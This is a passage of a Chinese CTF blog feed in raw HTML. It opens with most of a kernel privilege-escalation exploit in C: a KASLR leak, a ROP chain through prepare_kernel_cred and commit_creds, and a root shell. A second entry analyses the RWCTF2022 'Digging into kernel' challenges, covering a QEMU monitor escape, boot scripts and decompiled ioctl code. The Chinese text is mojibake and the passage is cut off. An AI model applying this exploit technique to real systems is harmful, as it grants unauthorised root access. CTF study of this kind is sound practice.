class="token directive keyword">define</span> <span class="token macro-name">MOV_ESP_0x39000000_RET</span> <span class="token expression"><span class="token number">0xffffffff819f3361</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff81bebe6b</span><span class="token operator">+</span>koff</span></span><span class="token class-name">size_t</span> commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff810ce710</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff810cebf0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff81c00fb0</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">size_t</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> idx<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>idx <span class="token operator">=</span> idx<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>idx <span class="token operator">=</span> idx<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_DEL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">sel</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>idx <span class="token operator">=</span> idx<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SELECT<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"sel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kheap"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sel</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> seq_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak<span class="token operator">-</span><span class="token number">0xffffffff8133f980</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>userland <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span> <span class="token operator">-</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_POPULATE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> prepare_kernel_cred<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> commit_creds<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span><span class="token function">memcpy</span><span class="token punctuation">(</span>userland<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf <span class="token operator">=</span> MOV_ESP_0x39000000_RET<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] seq.start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>seq_fd<span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/43720429c4760c37af3045a698ad6ebb_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RWCTF2022é«˜æ ¡èµ› - Digging into kernel 1 &amp; 2</title>
      <link href="/2024/03/22/RWCTF2022%E9%AB%98%E6%A0%A1%E8%B5%9B%20-%20Digging%20into%20kernel%201%20&amp;%202/"/>
      <url>/2024/03/22/RWCTF2022%E9%AB%98%E6%A0%A1%E8%B5%9B%20-%20Digging%20into%20kernel%201%20&amp;%202/</url>
      
        <content type="html"><![CDATA[<h1 id="Digging-into-kernel"><a href="#Digging-into-kernel" class="headerlink" title="Digging into kernel"></a>Digging into kernel</h1><p>å¯åŠ¨è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span>    <span class="token parameter variable">--nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜å¯åŠ¨è„šæœ¬ä¸­æ²¡æœ‰æŠŠ monitor è®¾ç½®ä¸º nullï¼Œé¢˜ç›®å¯ä»¥ç›´æ¥ä¸ç”¨çœ‹äº†ï¼Œå…ˆæŒ‰Â <code>ctrl + A</code>Â ç„¶åæŒ‰Â <code>C</code>Â ç„¶å enter å°±èƒ½è¿›å…¥ qemu çš„ monitor æ¨¡å¼ç›´æ¥æ‹¿ flag</p><h1 id="Digging-into-kernel-2"><a href="#Digging-into-kernel-2" class="headerlink" title="Digging into kernel 2"></a>Digging into kernel 2</h1><p>è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜å…¶å®å®Œå…¨ä¸€æ ·ï¼Œåªæ˜¯ä¿®å¤äº†å¯åŠ¨è„šæœ¬ä¸­ monitor çš„æ¼æ´</p><h2 id="ä¸€ã€é€†å‘åˆ†æ"><a href="#ä¸€ã€é€†å‘åˆ†æ" class="headerlink" title="ä¸€ã€é€†å‘åˆ†æ"></a>ä¸€ã€é€†å‘åˆ†æ</h2><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p>ï¼ˆå‡ºé¢˜äººæŠŠkaslrå†™æˆkalsrï¼Œæˆ‘è¿˜è¯´è°ƒè¯•çš„æ—¶å€™ä¸ºå•¥å…³ä¸æ‰ï¼Œæ·¦ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span><span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span><span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span><span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kaslr"</span> <span class="token punctuation">\</span><span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span><span class="token parameter variable">-monitor</span> null <span class="token punctuation">\</span><span class="token parameter variable">--nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†kaslrã€smepã€smap</p><p>ç»è¿‡å®éªŒä¹Ÿå¼€äº†kpti</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/home $ <span class="token function">cat</span> /sys/devices/system/cpu/vulnerabilities/meltdown                       â”‚Mitigation: PTI  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="rcS"><a href="#rcS" class="headerlink" title="rcS"></a>rcS</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">chown</span> <span class="token parameter variable">-R</span> <span class="token number">0</span>:0 /<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrictinsmod /xkmod.ko<span class="token function">chmod</span> <span class="token number">644</span> /dev/xkmod<span class="token function">chmod</span> <span class="token number">600</span> /flag<span class="token function">chmod</span> <span class="token number">600</span> /etc/init.d/rcS<span class="token function">mkdir</span> home <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> home<span class="token function">chown</span> <span class="token parameter variable">-R</span> <span class="token number">1000</span>:1000 <span class="token builtin class-name">.</span><span class="token builtin class-name">echo</span> <span class="token string">"-------------------------------------------"</span><span class="token builtin class-name">echo</span> <span class="token string">"|                                         |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |__/|  |  ||     |  |--   ,/|    |,/ |  |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |__/|  |  ||     |  |--   ,/|    |,/ |  |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"</span><span class="token builtin class-name">echo</span> <span class="token string">"|                                         |"</span><span class="token builtin class-name">echo</span> <span class="token string">"-------------------------------------------"</span><span class="token comment">#poweroff -d 120 -f &amp;</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span>poweroff <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="xkmod-ko"><a href="#xkmod-ko" class="headerlink" title="xkmod.ko"></a>xkmod.ko</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        Canary found      NX disabled   REL             No RPATH   No RUNPATH   60) Symbols  No00./rootfs/xkmod.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¼€äº†canary</p><p>åˆ›å»ºäº†ä¸€ä¸ªæ··æ‚è®¾å¤‡â€œxkmodâ€<br><img src="/EXP_FILE/a2edc15f46848921d4fcf5f07e8a8272_MD5.jpeg"></p><p>åœ¨æ¨¡å—è½½å…¥æ—¶ä¼šåˆ›å»ºä¸€ä¸ªåä¸ºâ€œlalalaâ€çš„cacheï¼Œobjectæ˜¯0xc0ï¼Œåé¢ä¸‰å‚éƒ½ä¸º0ï¼Œç”±äºæ²¡æœ‰è®¾ç½® SLAB_ACCOUNT æ ‡å¿—ä½æ•…è¯¥ kmem_cache ä¼šé»˜è®¤ä¸ kmalloc-192 åˆå¹¶</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">xkmod_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  kmem_cache <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1E4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>xkmod_device<span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token punctuation">(</span>kmem_cache <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_create</span><span class="token punctuation">(</span><span class="token string">"lalala"</span><span class="token punctuation">,</span> <span class="token number">192LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> v0<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ioctlå®ç°äº†åˆ†é…ã€ç¼–è¾‘ã€è¯»å–çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å…¨éƒ½æ²¡æœ‰ä¸Šé”</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">xkmod_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">0x6666666</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">&amp;&amp;</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x50</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">&lt;=</span> <span class="token number">0x70</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// set</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">0x7777777</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">0x1111111</span> <span class="token punctuation">)</span>          buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// add</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">&amp;&amp;</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x50</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">&lt;=</span> <span class="token number">0x70</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">xkmod_ioctl_cold</span><span class="token punctuation">(</span><span class="token 